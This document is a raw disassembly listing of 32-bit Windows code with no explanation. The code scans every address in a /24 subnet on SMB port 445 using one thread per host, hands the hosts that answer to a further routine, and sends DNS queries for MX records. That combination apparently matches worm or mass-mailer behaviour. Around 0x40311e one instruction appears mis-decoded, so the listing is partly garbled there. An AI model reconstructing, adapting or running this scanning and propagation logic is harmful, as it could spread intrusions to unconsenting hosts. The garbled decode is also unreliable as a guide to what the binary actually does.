  402aec:	85 c0                	test   %eax,%eax
  402aee:	7e 79                	jle    0x402b69
  402af0:	bb 01 00 00 00       	mov    $0x1,%ebx
  402af5:	8b 44 24 20          	mov    0x20(%esp),%eax
  402af9:	53                   	push   %ebx
  402afa:	57                   	push   %edi
  402afb:	50                   	push   %eax
  402afc:	55                   	push   %ebp
  402afd:	8d 4c 24 50          	lea    0x50(%esp),%ecx
  402b01:	68 a8 86 40 00       	push   $0x4086a8
  402b06:	51                   	push   %ecx
  402b07:	ff 15 48 71 40 00    	call   *0x407148
  402b0d:	6a 00                	push   $0x0
  402b0f:	8d 54 24 5c          	lea    0x5c(%esp),%edx
  402b13:	6a 00                	push   $0x0
  402b15:	52                   	push   %edx
  402b16:	68 90 2b 40 00       	push   $0x402b90
  402b1b:	6a 00                	push   $0x0
  402b1d:	6a 00                	push   $0x0
  402b1f:	ff 15 2c 71 40 00    	call   *0x40712c
  402b25:	8b f0                	mov    %eax,%esi
  402b27:	83 c4 30             	add    $0x30,%esp
  402b2a:	83 fe ff             	cmp    $0xffffffff,%esi
  402b2d:	74 2b                	je     0x402b5a
  402b2f:	68 e0 93 04 00       	push   $0x493e0
  402b34:	56                   	push   %esi
  402b35:	ff 15 68 70 40 00    	call   *0x407068
  402b3b:	3d 02 01 00 00       	cmp    $0x102,%eax
  402b40:	75 09                	jne    0x402b4b
  402b42:	6a 00                	push   $0x0
  402b44:	56                   	push   %esi
  402b45:	ff 15 64 70 40 00    	call   *0x407064
  402b4b:	56                   	push   %esi
  402b4c:	ff 15 7c 70 40 00    	call   *0x40707c
  402b52:	6a 32                	push   $0x32
  402b54:	ff 15 44 70 40 00    	call   *0x407044
  402b5a:	43                   	inc    %ebx
  402b5b:	81 fb ff 00 00 00    	cmp    $0xff,%ebx
  402b61:	7c 92                	jl     0x402af5
  402b63:	8b 1d 9c 70 40 00    	mov    0x40709c,%ebx
  402b69:	6a 64                	push   $0x64
  402b6b:	ff 15 44 70 40 00    	call   *0x407044
  402b71:	ff d3                	call   *%ebx
  402b73:	89 44 24 24          	mov    %eax,0x24(%esp)
  402b77:	33 c0                	xor    %eax,%eax
  402b79:	89 44 24 18          	mov    %eax,0x18(%esp)
  402b7d:	89 44 24 14          	mov    %eax,0x14(%esp)
  402b81:	e9 b1 fd ff ff       	jmp    0x402937
  402b86:	90                   	nop
  402b87:	90                   	nop
  402b88:	90                   	nop
  402b89:	90                   	nop
  402b8a:	90                   	nop
  402b8b:	90                   	nop
  402b8c:	90                   	nop
  402b8d:	90                   	nop
  402b8e:	90                   	nop
  402b8f:	90                   	nop
  402b90:	81 ec 7c 01 00 00    	sub    $0x17c,%esp
  402b96:	56                   	push   %esi
  402b97:	57                   	push   %edi
  402b98:	bf 58 97 40 00       	mov    $0x409758,%edi
  402b9d:	83 c9 ff             	or     $0xffffffff,%ecx
  402ba0:	33 c0                	xor    %eax,%eax
  402ba2:	8d 54 24 24          	lea    0x24(%esp),%edx
  402ba6:	f2 ae                	repnz scas %es:(%edi),%al
  402ba8:	f7 d1                	not    %ecx
  402baa:	2b f9                	sub    %ecx,%edi
  402bac:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  402bb3:	00 
  402bb4:	8b c1                	mov    %ecx,%eax
  402bb6:	8b f7                	mov    %edi,%esi
  402bb8:	8b fa                	mov    %edx,%edi
  402bba:	8d 54 24 24          	lea    0x24(%esp),%edx
  402bbe:	c1 e9 02             	shr    $0x2,%ecx
  402bc1:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402bc3:	8b c8                	mov    %eax,%ecx
  402bc5:	33 c0                	xor    %eax,%eax
  402bc7:	83 e1 03             	and    $0x3,%ecx
  402bca:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402bcc:	8b bc 24 88 01 00 00 	mov    0x188(%esp),%edi
  402bd3:	83 c9 ff             	or     $0xffffffff,%ecx
  402bd6:	f2 ae                	repnz scas %es:(%edi),%al
  402bd8:	f7 d1                	not    %ecx
  402bda:	2b f9                	sub    %ecx,%edi
  402bdc:	8b c1                	mov    %ecx,%eax
  402bde:	8b f7                	mov    %edi,%esi
  402be0:	8b fa                	mov    %edx,%edi
  402be2:	c1 e9 02             	shr    $0x2,%ecx
  402be5:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402be7:	8b c8                	mov    %eax,%ecx
  402be9:	83 e1 03             	and    $0x3,%ecx
  402bec:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402bee:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  402bf2:	51                   	push   %ecx
  402bf3:	e8 a0 0a 00 00       	call   0x403698
  402bf8:	68 bd 01 00 00       	push   $0x1bd
  402bfd:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  402c01:	66 c7 44 24 18 02 00 	movw   $0x2,0x18(%esp)
  402c08:	e8 6d 0a 00 00       	call   0x40367a
  402c0d:	6a 00                	push   $0x0
  402c0f:	6a 01                	push   $0x1
  402c11:	6a 02                	push   $0x2
  402c13:	66 89 44 24 22       	mov    %ax,0x22(%esp)
  402c18:	e8 57 0a 00 00       	call   0x403674
  402c1d:	8b f0                	mov    %eax,%esi
  402c1f:	83 fe ff             	cmp    $0xffffffff,%esi
  402c22:	0f 84 85 00 00 00    	je     0x402cad
  402c28:	8d 54 24 08          	lea    0x8(%esp),%edx
  402c2c:	52                   	push   %edx
  402c2d:	68 7e 66 04 80       	push   $0x8004667e
  402c32:	56                   	push   %esi
  402c33:	e8 36 0a 00 00       	call   0x40366e
  402c38:	8d 44 24 14          	lea    0x14(%esp),%eax
  402c3c:	6a 10                	push   $0x10
  402c3e:	50                   	push   %eax
  402c3f:	56                   	push   %esi
  402c40:	89 b4 24 90 00 00 00 	mov    %esi,0x90(%esp)
  402c47:	c7 84 24 8c 00 00 00 	movl   $0x1,0x8c(%esp)
  402c4e:	01 00 00 00 
  402c52:	c7 44 24 18 03 00 00 	movl   $0x3,0x18(%esp)
  402c59:	00 
  402c5a:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  402c61:	00 
  402c62:	e8 01 0a 00 00       	call   0x403668
  402c67:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  402c6b:	8d 94 24 80 00 00 00 	lea    0x80(%esp),%edx
  402c72:	51                   	push   %ecx
  402c73:	6a 00                	push   $0x0
  402c75:	52                   	push   %edx
  402c76:	6a 00                	push   $0x0
  402c78:	6a 00                	push   $0x0
  402c7a:	e8 e3 09 00 00       	call   0x403662
  402c7f:	56                   	push   %esi
  402c80:	8b f8                	mov    %eax,%edi
  402c82:	e8 d5 09 00 00       	call   0x40365c
  402c87:	85 ff                	test   %edi,%edi
  402c89:	7e 22                	jle    0x402cad
  402c8b:	8d 44 24 24          	lea    0x24(%esp),%eax
  402c8f:	8d 4c 24 4c          	lea    0x4c(%esp),%ecx
  402c93:	50                   	push   %eax
  402c94:	68 b4 86 40 00       	push   $0x4086b4
  402c99:	51                   	push   %ecx
  402c9a:	ff 15 38 71 40 00    	call   *0x407138
  402ca0:	8d 54 24 58          	lea    0x58(%esp),%edx
  402ca4:	52                   	push   %edx
  402ca5:	e8 a6 f5 ff ff       	call   0x402250
  402caa:	83 c4 10             	add    $0x10,%esp
  402cad:	6a 00                	push   $0x0
  402caf:	ff 15 40 71 40 00    	call   *0x407140
  402cb5:	83 c4 04             	add    $0x4,%esp
  402cb8:	5f                   	pop    %edi
  402cb9:	5e                   	pop    %esi
  402cba:	81 c4 7c 01 00 00    	add    $0x17c,%esp
  402cc0:	c3                   	ret
  402cc1:	90                   	nop
  402cc2:	90                   	nop
  402cc3:	90                   	nop
  402cc4:	90                   	nop
  402cc5:	90                   	nop
  402cc6:	90                   	nop
  402cc7:	90                   	nop
  402cc8:	90                   	nop
  402cc9:	90                   	nop
  402cca:	90                   	nop
  402ccb:	90                   	nop
  402ccc:	90                   	nop
  402ccd:	90                   	nop
  402cce:	90                   	nop
  402ccf:	90                   	nop
  402cd0:	53                   	push   %ebx
  402cd1:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  402cd5:	55                   	push   %ebp
  402cd6:	8b 2d 44 70 40 00    	mov    0x407044,%ebp
  402cdc:	56                   	push   %esi
  402cdd:	57                   	push   %edi
  402cde:	8b 7c 24 18          	mov    0x18(%esp),%edi
  402ce2:	33 f6                	xor    %esi,%esi
  402ce4:	8d 44 24 18          	lea    0x18(%esp),%eax
  402ce8:	50                   	push   %eax
  402ce9:	57                   	push   %edi
  402cea:	53                   	push   %ebx
  402ceb:	e8 20 00 00 00       	call   0x402d10
  402cf0:	83 c4 0c             	add    $0xc,%esp
  402cf3:	85 c0                	test   %eax,%eax
  402cf5:	75 13                	jne    0x402d0a
  402cf7:	83 7c 24 18 02       	cmpl   $0x2,0x18(%esp)
  402cfc:	74 0a                	je     0x402d08
  402cfe:	6a 64                	push   $0x64
  402d00:	ff d5                	call   *%ebp
  402d02:	46                   	inc    %esi
  402d03:	83 fe 02             	cmp    $0x2,%esi
  402d06:	7c dc                	jl     0x402ce4
  402d08:	33 c0                	xor    %eax,%eax
  402d0a:	5f                   	pop    %edi
  402d0b:	5e                   	pop    %esi
  402d0c:	5d                   	pop    %ebp
  402d0d:	5b                   	pop    %ebx
  402d0e:	c3                   	ret
  402d0f:	90                   	nop
  402d10:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402d14:	81 ec 24 01 00 00    	sub    $0x124,%esp
  402d1a:	53                   	push   %ebx
  402d1b:	55                   	push   %ebp
  402d1c:	56                   	push   %esi
  402d1d:	8b 35 90 70 40 00    	mov    0x407090,%esi
  402d23:	57                   	push   %edi
  402d24:	33 ff                	xor    %edi,%edi
  402d26:	68 00 10 00 00       	push   $0x1000
  402d2b:	57                   	push   %edi
  402d2c:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  402d32:	ff d6                	call   *%esi
  402d34:	50                   	push   %eax
  402d35:	ff 15 94 70 40 00    	call   *0x407094
  402d3b:	8b d8                	mov    %eax,%ebx
  402d3d:	3b df                	cmp    %edi,%ebx
  402d3f:	0f 84 64 02 00 00    	je     0x402fa9
  402d45:	6a 11                	push   $0x11
  402d47:	6a 02                	push   $0x2
  402d49:	6a 02                	push   $0x2
  402d4b:	ff 15 84 71 40 00    	call   *0x407184
  402d51:	8b e8                	mov    %eax,%ebp
  402d53:	3b ef                	cmp    %edi,%ebp
  402d55:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  402d59:	0f 84 3f 02 00 00    	je     0x402f9e
  402d5f:	83 fd ff             	cmp    $0xffffffff,%ebp
  402d62:	0f 84 36 02 00 00    	je     0x402f9e
  402d68:	33 c0                	xor    %eax,%eax
  402d6a:	89 44 24 18          	mov    %eax,0x18(%esp)
  402d6e:	eb 02                	jmp    0x402d72
  402d70:	33 ff                	xor    %edi,%edi
  402d72:	3b c7                	cmp    %edi,%eax
  402d74:	89 7c 24 10          	mov    %edi,0x10(%esp)
  402d78:	75 07                	jne    0x402d81
  402d7a:	68 00 01 00 00       	push   $0x100
  402d7f:	eb 01                	jmp    0x402d82
  402d81:	57                   	push   %edi
  402d82:	ff 15 64 71 40 00    	call   *0x407164
  402d88:	8b 8c 24 3c 01 00 00 	mov    0x13c(%esp),%ecx
  402d8f:	8b 94 24 38 01 00 00 	mov    0x138(%esp),%edx
  402d96:	50                   	push   %eax
  402d97:	51                   	push   %ecx
  402d98:	52                   	push   %edx
  402d99:	55                   	push   %ebp
  402d9a:	e8 21 02 00 00       	call   0x402fc0
  402d9f:	83 c4 10             	add    $0x10,%esp
  402da2:	85 c0                	test   %eax,%eax
  402da4:	0f 85 90 01 00 00    	jne    0x402f3a
  402daa:	8d 44 24 28          	lea    0x28(%esp),%eax
  402dae:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  402db2:	50                   	push   %eax
  402db3:	57                   	push   %edi
  402db4:	57                   	push   %edi
  402db5:	51                   	push   %ecx
  402db6:	57                   	push   %edi
  402db7:	89 6c 24 48          	mov    %ebp,0x48(%esp)
  402dbb:	c7 44 24 44 01 00 00 	movl   $0x1,0x44(%esp)
  402dc2:	00 
  402dc3:	c7 44 24 3c 0c 00 00 	movl   $0xc,0x3c(%esp)
  402dca:	00 
  402dcb:	89 7c 24 40          	mov    %edi,0x40(%esp)
  402dcf:	ff 15 74 71 40 00    	call   *0x407174
  402dd5:	85 c0                	test   %eax,%eax
  402dd7:	0f 8e 5d 01 00 00    	jle    0x402f3a
  402ddd:	57                   	push   %edi
  402dde:	68 00 10 00 00       	push   $0x1000
  402de3:	53                   	push   %ebx
  402de4:	55                   	push   %ebp
  402de5:	89 3b                	mov    %edi,(%ebx)
  402de7:	ff 15 5c 71 40 00    	call   *0x40715c
  402ded:	8b f0                	mov    %eax,%esi
  402def:	3b f7                	cmp    %edi,%esi
  402df1:	89 74 24 24          	mov    %esi,0x24(%esp)
  402df5:	0f 8e 3f 01 00 00    	jle    0x402f3a
  402dfb:	83 fe 0c             	cmp    $0xc,%esi
  402dfe:	0f 86 36 01 00 00    	jbe    0x402f3a
  402e04:	66 8b 53 02          	mov    0x2(%ebx),%dx
  402e08:	8b 3d 50 71 40 00    	mov    0x407150,%edi
  402e0e:	52                   	push   %edx
  402e0f:	ff d7                	call   *%edi
  402e11:	83 e0 0f             	and    $0xf,%eax
  402e14:	83 f8 03             	cmp    $0x3,%eax
  402e17:	0f 84 31 01 00 00    	je     0x402f4e
  402e1d:	83 f8 02             	cmp    $0x2,%eax
  402e20:	75 14                	jne    0x402e36
  402e22:	66 8b 43 02          	mov    0x2(%ebx),%ax
  402e26:	50                   	push   %eax
  402e27:	ff d7                	call   *%edi
  402e29:	a8 80                	test   $0x80,%al
  402e2b:	0f 85 2c 01 00 00    	jne    0x402f5d
  402e31:	e9 04 01 00 00       	jmp    0x402f3a
  402e36:	85 c0                	test   %eax,%eax
  402e38:	0f 85 fc 00 00 00    	jne    0x402f3a
  402e3e:	56                   	push   %esi
  402e3f:	53                   	push   %ebx
  402e40:	e8 8b 03 00 00       	call   0x4031d0
  402e45:	8b f8                	mov    %eax,%edi
  402e47:	83 c4 08             	add    $0x8,%esp
  402e4a:	85 ff                	test   %edi,%edi
  402e4c:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  402e50:	0f 84 e4 00 00 00    	je     0x402f3a
  402e56:	33 c0                	xor    %eax,%eax
  402e58:	8b ef                	mov    %edi,%ebp
  402e5a:	89 44 24 14          	mov    %eax,0x14(%esp)
  402e5e:	89 44 24 10          	mov    %eax,0x10(%esp)
  402e62:	66 83 bd 0a 01 00 00 	cmpw   $0x1,0x10a(%ebp)
  402e69:	01 
  402e6a:	0f 85 a6 00 00 00    	jne    0x402f16
  402e70:	66 83 bd 08 01 00 00 	cmpw   $0xf,0x108(%ebp)
  402e77:	0f 
  402e78:	0f 85 98 00 00 00    	jne    0x402f16
  402e7e:	66 83 bd 0c 01 00 00 	cmpw   $0x3,0x10c(%ebp)
  402e85:	03 
  402e86:	0f 82 8a 00 00 00    	jb     0x402f16
  402e8c:	68 08 01 00 00       	push   $0x108
  402e91:	6a 00                	push   $0x0
  402e93:	ff 15 90 70 40 00    	call   *0x407090
  402e99:	50                   	push   %eax
  402e9a:	ff 15 94 70 40 00    	call   *0x407094
  402ea0:	8b f0                	mov    %eax,%esi
  402ea2:	85 f6                	test   %esi,%esi
  402ea4:	74 7f                	je     0x402f25
  402ea6:	b9 42 00 00 00       	mov    $0x42,%ecx
  402eab:	33 c0                	xor    %eax,%eax
  402ead:	8b fe                	mov    %esi,%edi
  402eaf:	f3 ab                	rep stos %eax,%es:(%edi)
  402eb1:	8b 8d 10 01 00 00    	mov    0x110(%ebp),%ecx
  402eb7:	66 8b 14 19          	mov    (%ecx,%ebx,1),%dx
  402ebb:	52                   	push   %edx
  402ebc:	ff 15 50 71 40 00    	call   *0x407150
  402ec2:	25 ff ff 00 00       	and    $0xffff,%eax
  402ec7:	8d 7e 08             	lea    0x8(%esi),%edi
  402eca:	89 46 04             	mov    %eax,0x4(%esi)
  402ecd:	8b 8d 10 01 00 00    	mov    0x110(%ebp),%ecx
  402ed3:	8b 44 24 24          	mov    0x24(%esp),%eax
  402ed7:	57                   	push   %edi
  402ed8:	83 c1 02             	add    $0x2,%ecx
  402edb:	50                   	push   %eax
  402edc:	51                   	push   %ecx
  402edd:	53                   	push   %ebx
  402ede:	e8 fd 01 00 00       	call   0x4030e0
  402ee3:	8a 07                	mov    (%edi),%al
  402ee5:	83 c4 10             	add    $0x10,%esp
  402ee8:	84 c0                	test   %al,%al
  402eea:	75 12                	jne    0x402efe
  402eec:	56                   	push   %esi
  402eed:	6a 00                	push   $0x0
  402eef:	ff 15 90 70 40 00    	call   *0x407090
  402ef5:	50                   	push   %eax
  402ef6:	ff 15 6c 70 40 00    	call   *0x40706c
  402efc:	eb 18                	jmp    0x402f16
  402efe:	8b 44 24 14          	mov    0x14(%esp),%eax
  402f02:	85 c0                	test   %eax,%eax
  402f04:	75 0a                	jne    0x402f10
  402f06:	89 74 24 14          	mov    %esi,0x14(%esp)
  402f0a:	89 74 24 10          	mov    %esi,0x10(%esp)
  402f0e:	eb 06                	jmp    0x402f16
  402f10:	89 30                	mov    %esi,(%eax)
  402f12:	89 74 24 14          	mov    %esi,0x14(%esp)
  402f16:	8b 6d 00             	mov    0x0(%ebp),%ebp
  402f19:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  402f1d:	85 ed                	test   %ebp,%ebp
  402f1f:	0f 85 3d ff ff ff    	jne    0x402e62
  402f25:	8b 44 24 10          	mov    0x10(%esp),%eax
  402f29:	57                   	push   %edi
  402f2a:	85 c0                	test   %eax,%eax
  402f2c:	75 3e                	jne    0x402f6c
  402f2e:	e8 6d 02 00 00       	call   0x4031a0
  402f33:	8b 6c 24 24          	mov    0x24(%esp),%ebp
  402f37:	83 c4 04             	add    $0x4,%esp
  402f3a:	8b 44 24 18          	mov    0x18(%esp),%eax
  402f3e:	40                   	inc    %eax
  402f3f:	83 f8 02             	cmp    $0x2,%eax
  402f42:	89 44 24 18          	mov    %eax,0x18(%esp)
  402f46:	0f 8c 24 fe ff ff    	jl     0x402d70
  402f4c:	eb 2a                	jmp    0x402f78
  402f4e:	8b 94 24 40 01 00 00 	mov    0x140(%esp),%edx
  402f55:	c7 02 02 00 00 00    	movl   $0x2,(%edx)
  402f5b:	eb 1b                	jmp    0x402f78
  402f5d:	8b 84 24 40 01 00 00 	mov    0x140(%esp),%eax
  402f64:	c7 00 02 00 00 00    	movl   $0x2,(%eax)
  402f6a:	eb 0c                	jmp    0x402f78
  402f6c:	e8 2f 02 00 00       	call   0x4031a0
  402f71:	8b 6c 24 24          	mov    0x24(%esp),%ebp
  402f75:	83 c4 04             	add    $0x4,%esp
  402f78:	53                   	push   %ebx
  402f79:	6a 00                	push   $0x0
  402f7b:	ff 15 90 70 40 00    	call   *0x407090
  402f81:	50                   	push   %eax
  402f82:	ff 15 6c 70 40 00    	call   *0x40706c
  402f88:	55                   	push   %ebp
  402f89:	ff 15 78 71 40 00    	call   *0x407178
  402f8f:	8b 44 24 10          	mov    0x10(%esp),%eax
  402f93:	5f                   	pop    %edi
  402f94:	5e                   	pop    %esi
  402f95:	5d                   	pop    %ebp
  402f96:	5b                   	pop    %ebx
  402f97:	81 c4 24 01 00 00    	add    $0x124,%esp
  402f9d:	c3                   	ret
  402f9e:	53                   	push   %ebx
  402f9f:	57                   	push   %edi
  402fa0:	ff d6                	call   *%esi
  402fa2:	50                   	push   %eax
  402fa3:	ff 15 6c 70 40 00    	call   *0x40706c
  402fa9:	5f                   	pop    %edi
  402faa:	5e                   	pop    %esi
  402fab:	5d                   	pop    %ebp
  402fac:	33 c0                	xor    %eax,%eax
  402fae:	5b                   	pop    %ebx
  402faf:	81 c4 24 01 00 00    	add    $0x124,%esp
  402fb5:	c3                   	ret
  402fb6:	90                   	nop
  402fb7:	90                   	nop
  402fb8:	90                   	nop
  402fb9:	90                   	nop
  402fba:	90                   	nop
  402fbb:	90                   	nop
  402fbc:	90                   	nop
  402fbd:	90                   	nop
  402fbe:	90                   	nop
  402fbf:	90                   	nop
  402fc0:	81 ec 00 04 00 00    	sub    $0x400,%esp
  402fc6:	56                   	push   %esi
  402fc7:	57                   	push   %edi
  402fc8:	b9 00 01 00 00       	mov    $0x100,%ecx
  402fcd:	33 c0                	xor    %eax,%eax
  402fcf:	8d 7c 24 08          	lea    0x8(%esp),%edi
  402fd3:	f3 ab                	rep stos %eax,%es:(%edi)
  402fd5:	ff 15 9c 70 40 00    	call   *0x40709c
  402fdb:	8b 3d 64 71 40 00    	mov    0x407164,%edi
  402fe1:	66 89 44 24 08       	mov    %ax,0x8(%esp)
  402fe6:	66 8b 84 24 18 04 00 	mov    0x418(%esp),%ax
  402fed:	00 
  402fee:	6a 01                	push   $0x1
  402ff0:	66 89 44 24 0e       	mov    %ax,0xe(%esp)
  402ff5:	ff d7                	call   *%edi
  402ff7:	8b 94 24 14 04 00 00 	mov    0x414(%esp),%edx
  402ffe:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  403002:	51                   	push   %ecx
  403003:	52                   	push   %edx
  403004:	66 89 44 24 14       	mov    %ax,0x14(%esp)
  403009:	66 c7 44 24 16 00 00 	movw   $0x0,0x16(%esp)
  403010:	66 c7 44 24 18 00 00 	movw   $0x0,0x18(%esp)
  403017:	66 c7 44 24 1a 00 00 	movw   $0x0,0x1a(%esp)
  40301e:	e8 5d 00 00 00       	call   0x403080
  403023:	83 c4 08             	add    $0x8,%esp
  403026:	8b f0                	mov    %eax,%esi
  403028:	83 c6 0c             	add    $0xc,%esi
  40302b:	6a 0f                	push   $0xf
  40302d:	ff d7                	call   *%edi
  40302f:	66 89 44 34 08       	mov    %ax,0x8(%esp,%esi,1)
  403034:	6a 01                	push   $0x1
  403036:	83 c6 02             	add    $0x2,%esi
  403039:	ff d7                	call   *%edi
  40303b:	8b 94 24 0c 04 00 00 	mov    0x40c(%esp),%edx
  403042:	66 89 44 34 08       	mov    %ax,0x8(%esp,%esi,1)
  403047:	8b 84 24 10 04 00 00 	mov    0x410(%esp),%eax
  40304e:	6a 10                	push   $0x10
  403050:	50                   	push   %eax
  403051:	83 c6 02             	add    $0x2,%esi
  403054:	6a 00                	push   $0x0
  403056:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  40305a:	56                   	push   %esi
  40305b:	51                   	push   %ecx
  40305c:	52                   	push   %edx
  40305d:	ff 15 68 71 40 00    	call   *0x407168
  403063:	33 c9                	xor    %ecx,%ecx
  403065:	5f                   	pop    %edi
  403066:	85 c0                	test   %eax,%eax
  403068:	0f 9e c1             	setle  %cl
  40306b:	8b c1                	mov    %ecx,%eax
  40306d:	5e                   	pop    %esi
  40306e:	81 c4 00 04 00 00    	add    $0x400,%esp
  403074:	c3                   	ret
  403075:	90                   	nop
  403076:	90                   	nop
  403077:	90                   	nop
  403078:	90                   	nop
  403079:	90                   	nop
  40307a:	90                   	nop
  40307b:	90                   	nop
  40307c:	90                   	nop
  40307d:	90                   	nop
  40307e:	90                   	nop
  40307f:	90                   	nop
  403080:	55                   	push   %ebp
  403081:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  403085:	56                   	push   %esi
  403086:	8b 74 24 0c          	mov    0xc(%esp),%esi
  40308a:	57                   	push   %edi
  40308b:	33 c0                	xor    %eax,%eax
  40308d:	8a 0e                	mov    (%esi),%cl
  40308f:	33 ff                	xor    %edi,%edi
  403091:	84 c9                	test   %cl,%cl
  403093:	74 3c                	je     0x4030d1
  403095:	8a 14 30             	mov    (%eax,%esi,1),%dl
  403098:	8b c8                	mov    %eax,%ecx
  40309a:	84 d2                	test   %dl,%dl
  40309c:	74 0e                	je     0x4030ac
  40309e:	80 fa 2e             	cmp    $0x2e,%dl
  4030a1:	74 09                	je     0x4030ac
  4030a3:	8a 54 31 01          	mov    0x1(%ecx,%esi,1),%dl
  4030a7:	41                   	inc    %ecx
  4030a8:	84 d2                	test   %dl,%dl
  4030aa:	75 f2                	jne    0x40309e
  4030ac:	8a d1                	mov    %cl,%dl
  4030ae:	2a d0                	sub    %al,%dl
  4030b0:	88 14 2f             	mov    %dl,(%edi,%ebp,1)
  4030b3:	47                   	inc    %edi
  4030b4:	3b c1                	cmp    %ecx,%eax
  4030b6:	7d 0c                	jge    0x4030c4
  4030b8:	8a 14 30             	mov    (%eax,%esi,1),%dl
  4030bb:	88 14 2f             	mov    %dl,(%edi,%ebp,1)
  4030be:	47                   	inc    %edi
  4030bf:	40                   	inc    %eax
  4030c0:	3b c1                	cmp    %ecx,%eax
  4030c2:	7c f4                	jl     0x4030b8
  4030c4:	80 3c 30 2e          	cmpb   $0x2e,(%eax,%esi,1)
  4030c8:	75 01                	jne    0x4030cb
  4030ca:	40                   	inc    %eax
  4030cb:	80 3c 30 00          	cmpb   $0x0,(%eax,%esi,1)
  4030cf:	75 c4                	jne    0x403095
  4030d1:	c6 04 2f 00          	movb   $0x0,(%edi,%ebp,1)
  4030d5:	8d 47 01             	lea    0x1(%edi),%eax
  4030d8:	5f                   	pop    %edi
  4030d9:	5e                   	pop    %esi
  4030da:	5d                   	pop    %ebp
  4030db:	c3                   	ret
  4030dc:	90                   	nop
  4030dd:	90                   	nop
  4030de:	90                   	nop
  4030df:	90                   	nop
  4030e0:	51                   	push   %ecx
  4030e1:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4030e5:	53                   	push   %ebx
  4030e6:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  4030ea:	55                   	push   %ebp
  4030eb:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  4030ef:	56                   	push   %esi
  4030f0:	33 f6                	xor    %esi,%esi
  4030f2:	3b c3                	cmp    %ebx,%eax
  4030f4:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  4030fb:	00 
  4030fc:	c6 45 00 00          	movb   $0x0,0x0(%ebp)
  403100:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  403107:	00 
  403108:	7d 75                	jge    0x40317f
  40310a:	57                   	push   %edi
  40310b:	8b 7c 24 18          	mov    0x18(%esp),%edi
  40310f:	81 fe ff 00 00 00    	cmp    $0xff,%esi
  403115:	7d 57                	jge    0x40316e
  403117:	33 c9                	xor    %ecx,%ecx
  403119:	8a 0c 07             	mov    (%edi,%eax,1),%cl
  40311c:	85 c9                	test   %ecx,%ecx
  40311e:	6b 52 83 f9          	imul   $0xfffffff9,-0x7d(%edx),%edx
  403122:	40                   	inc    %eax
  403123:	7d 1b                	jge    0x403140
  403125:	40                   	inc    %eax
  403126:	85 c9                	test   %ecx,%ecx
  403128:	7e 0b                	jle    0x403135
  40312a:	8a 14 07             	mov    (%edi,%eax,1),%dl
  40312d:	88 14 2e             	mov    %dl,(%esi,%ebp,1)
  403130:	46                   	inc    %esi
  403131:	40                   	inc    %eax
  403132:	49                   	dec    %ecx
  403133:	75 f5                	jne    0x40312a
  403135:	c6 04 2e 2e          	movb   $0x2e,(%esi,%ebp,1)
  403139:	46                   	inc    %esi
  40313a:	3b c3                	cmp    %ebx,%eax
  40313c:	7c d1                	jl     0x40310f
  40313e:	eb 2e                	jmp    0x40316e
  403140:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  403144:	85 c9                	test   %ecx,%ecx
  403146:	75 07                	jne    0x40314f
  403148:	8d 48 02             	lea    0x2(%eax),%ecx
  40314b:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  40314f:	66 8b 14 07          	mov    (%edi,%eax,1),%dx
  403153:	c7 44 24 24 01 00 00 	movl   $0x1,0x24(%esp)
  40315a:	00 
  40315b:	52                   	push   %edx
  40315c:	ff 15 50 71 40 00    	call   *0x407150
  403162:	25 ff 3f 00 00       	and    $0x3fff,%eax
  403167:	3b c3                	cmp    %ebx,%eax
  403169:	7d 03                	jge    0x40316e
  40316b:	eb a2                	jmp    0x40310f
  40316d:	40                   	inc    %eax
  40316e:	85 f6                	test   %esi,%esi
  403170:	5f                   	pop    %edi
  403171:	7e 0c                	jle    0x40317f
  403173:	80 7c 2e ff 2e       	cmpb   $0x2e,-0x1(%esi,%ebp,1)
  403178:	75 05                	jne    0x40317f
  40317a:	4e                   	dec    %esi
  40317b:	85 f6                	test   %esi,%esi
  40317d:	7f f4                	jg     0x403173
  40317f:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403183:	c6 04 2e 00          	movb   $0x0,(%esi,%ebp,1)
  403187:	5e                   	pop    %esi
  403188:	5d                   	pop    %ebp
  403189:	85 c9                	test   %ecx,%ecx
  40318b:	5b                   	pop    %ebx
  40318c:	74 04                	je     0x403192
  40318e:	8b 44 24 00          	mov    0x0(%esp),%eax
  403192:	59                   	pop    %ecx
  403193:	c3                   	ret
  403194:	90                   	nop
  403195:	90                   	nop
  403196:	90                   	nop
  403197:	90                   	nop
  403198:	90                   	nop
  403199:	90                   	nop
  40319a:	90                   	nop
  40319b:	90                   	nop
  40319c:	90                   	nop
  40319d:	90                   	nop
  40319e:	90                   	nop
  40319f:	90                   	nop
  4031a0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4031a4:	85 c0                	test   %eax,%eax
  4031a6:	74 22                	je     0x4031ca
  4031a8:	53                   	push   %ebx
  4031a9:	8b 1d 90 70 40 00    	mov    0x407090,%ebx
  4031af:	56                   	push   %esi
  4031b0:	57                   	push   %edi
  4031b1:	8b 3d 6c 70 40 00    	mov    0x40706c,%edi
  4031b7:	8b 30                	mov    (%eax),%esi
  4031b9:	50                   	push   %eax
  4031ba:	6a 00                	push   $0x0
  4031bc:	ff d3                	call   *%ebx
  4031be:	50                   	push   %eax
  4031bf:	ff d7                	call   *%edi
  4031c1:	85 f6                	test   %esi,%esi
